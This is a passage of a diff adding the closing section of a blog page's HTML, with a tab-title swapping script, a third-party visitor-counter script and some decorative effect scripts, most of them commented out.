+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    <script type="text/javascript" src="/resources/love.js"></script>
+    <!-- <script type="text/javascript" src="/resources/float.js"></script> -->
+    <!-- <script type="text/javascript" src="/resources/typewriter.js"></script> -->
+    <!-- <script type="text/javascript" color=0,104,183 opacity=1 zindex=-1 count=50 src="/resources/particle.js"></script> -->
+
+
+  </div>
+</body>
+</html>
